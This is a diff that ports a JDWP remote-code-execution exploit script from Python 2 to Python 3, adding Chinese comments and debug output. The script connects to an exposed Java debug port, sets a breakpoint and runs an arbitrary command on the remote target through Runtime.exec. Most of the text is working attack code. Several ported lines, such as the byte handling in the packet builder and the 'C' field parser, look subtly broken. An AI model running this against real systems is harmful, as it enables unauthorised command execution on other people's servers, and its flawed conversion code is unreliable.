@@ -8,12 +8,14 @@
 # And special cheers to @lanjelot
 #
 
+from base64 import encode
 import socket
 import time
 import sys
 import struct
 import urllib
 import argparse
+import traceback
 
 
 
@@ -83,14 +85,25 @@ class JDWPClient:
         return
 
     def create_packet(self, cmdsig, data=""):
+        #######################################################################################################################
+        #                                            发送命令对象头                                                            #
+        #######################################################################################################################
+        #  4字节(头部长度11+数据位长度)  #        4字节(命令序号ID)       #  1字节(发送为0) #   1字节(命令分组) #    1字节(命令id)  #
+        #######################################################################################################################
         flags = 0x00
         cmdset, cmd = cmdsig
         pktlen = len(data) + 11
-        pkt = struct.pack(">IIccc", pktlen, self.id, chr(flags), chr(cmdset), chr(cmd))
-        pkt+= data
+        pkt = struct.pack(">IIccc", pktlen, self.id,
+                        bytes(chr(flags), encoding = "utf-8"),
+                         bytes( chr(cmdset), encoding = "utf-8"),
+                         bytes( chr(cmd), encoding = "utf-8")
+                          )
+        pkt+= bytes(data, encoding = "utf-8")
+        print("发送命令包: %s" % pkt)
         self.id += 2
         return pkt
 
+    # 回复的消息，把头去了返回
     def read_reply(self):
         header = self.socket.recv(11)
         pktlen, id, flags, errcode = struct.unpack(">IIcH", header)
@@ -99,7 +112,7 @@ class JDWPClient:
             if errcode :
                 raise Exception("Received errcode %d" % errcode)
 
-        buf = ""
+        buf = bytes("", encoding="utf-8")
         while len(buf) + 11 < pktlen:
             data = self.socket.recv(1024)
             if len(data):
@@ -118,6 +131,8 @@ class JDWPClient:
             buf = buf[4:]
         else:
             nb_entries = 1
+        
+        print("解析回应对象，一共 %s 个对象 : " % nb_entries)
 
         for i in range(nb_entries):
             data = {}
@@ -133,7 +148,10 @@ class JDWPClient:
                     data[name] = buf[index+4:index+4+l]
                     index += 4+l
                 elif fmt == 'C':
-                    data[name] = ord(struct.unpack(">c", buf[index])[0])
+                    data[name] = ord(
+                        struct.unpack(">c",
+                                                   bytes(str(buf[index]), encoding="utf-8")
+                                      )[0])
                     index += 1
                 elif fmt == 'Z':
                     t = ord(struct.unpack(">c", buf[index])[0])
@@ -147,7 +165,7 @@ class JDWPClient:
                         index=0
 
                 else:
-                    print "Error"
+                    print("Error")
                     sys.exit(1)
 
             entries.append( data )
@@ -172,39 +190,46 @@ class JDWPClient:
         return
 
     def start(self):
+        # 握手
         self.handshake(self.host, self.port)
+        # 获取 各类id大小 fieldId\methodId\objectId\referenctTypeId\frameId
         self.idsizes()
+        # 获取版本号
         self.getversion()
+        # 获取所有的类
         self.allclasses()
         return
 
     def handshake(self, host, port):
+        print("握手")
         s = socket.socket()
         try:
             s.connect( (host, port) )
         except socket.error as msg:
             raise Exception("Failed to connect: %s" % msg)
-
-        s.send( HANDSHAKE )
-
-        if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
+        # 发送shake
+        s.send( bytes(HANDSHAKE, encoding = "utf-8" ))
+        h = str(s.recv( len(HANDSHAKE) ), encoding = "utf-8")
+        # 返回shake
+        if h != HANDSHAKE:
             raise Exception("Failed to handshake")
         else:
-            self.socket = s
+            self.socket = s # 握手成功
 
         return
 
     def leave(self):
-        self.socket.close()
+        self.socket.close() # 请求结束
         return
 
     def getversion(self):
+        print("version")
         self.socket.sendall( self.create_packet(VERSION_SIG) )
         buf = self.read_reply()
         formats = [ ('S', "description"), ('I', "jdwpMajor"), ('I', "jdwpMinor"),
                     ('S', "vmVersion"), ('S', "vmName"), ]
         for entry in self.parse_entries(buf, formats, False):
-            for name,value  in entry.iteritems():
+            for name,value  in entry.items():
                 setattr(self, name, value)
         return
 
@@ -212,13 +237,15 @@ class JDWPClient:
     def version(self):
         return "%s - %s" % (self.vmName, self.vmVersion)
 
+    # 返回vm各种类型的占位大小: 
     def idsizes(self):
+        print("idsizes")
         self.socket.sendall( self.create_packet(IDSIZES_SIG) )
         buf = self.read_reply()
         formats = [ ("I", "fieldIDSize"), ("I", "methodIDSize"), ("I", "objectIDSize"),
                     ("I", "referenceTypeIDSize"), ("I", "frameIDSize") ]
         for entry in self.parse_entries(buf, formats, False):
-            for name,value  in entry.iteritems():
+            for name,value  in entry.items():
                 setattr(self, name, value)
         return
 
@@ -247,6 +274,8 @@ class JDWPClient:
         try:
             getattr(self, "classes")
         except:
+            # 获取所有被vm加载的类
+            print("获取所有类")
             self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
             buf = self.read_reply()
             formats = [ ('C', "refTypeTag"),
@@ -533,7 +562,7 @@ def runtime_exec_info(jdwp, threadId):
         print ("[-] Cannot find method System.getProperty()")
         return False
 
-    for propStr, propDesc in properties.iteritems():
+    for propStr, propDesc in properties.items():
         propObjIds =  jdwp.createstring(propStr)
         if len(propObjIds) == 0:
             print ("[-] Failed to allocate command")
@@ -578,7 +607,7 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
 
     if rt is None:
-        print "[-] Failed to invoke Runtime.getRuntime()"
+        print ("[-] Failed to invoke Runtime.getRuntime()")
         return False
     print ("[+] Runtime.getRuntime() returned context id:%#x" % rt)
 
@@ -617,16 +646,17 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Universal exploitation script for JDWP by @_hugsy_",
                                      formatter_class=argparse.ArgumentDefaultsHelpFormatter )
 
-    parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True)
-    parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port")
+    parser.add_argument("-t", "--target", type=str, metavar="IP", help="Remote target IP", required=True) # ip
+    parser.add_argument("-p", "--port", type=int, metavar="PORT", default=8000, help="Remote target port") # 端口
 
-    parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
+    parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",         # 断点
                         default="java.net.ServerSocket.accept", help="Specify full path to method to break on")
-    parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
+    parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND", # 命令
                         help="Specify command to execute remotely")
 
     args = parser.parse_args()
 
+    # 断点解析成类名和方法名
     classname, meth = str2fqclass(args.break_on)
     setattr(args, "break_on_class", classname)
     setattr(args, "break_on_method", meth)
@@ -635,6 +665,7 @@ if __name__ == "__main__":
 
     try:
         cli = JDWPClient(args.target, args.port)
+        # 启动
         cli.start()
 
         if runtime_exec(cli, args) == False:
@@ -645,7 +676,8 @@ if __name__ == "__main__":
         print ("[+] Exiting on user's request")
 
     except Exception as e:
-        print ("[-] Exception: %s" % e)
+        print(traceback.format_exc())
+        print (e)
         retcode = 1
         cli = None
 
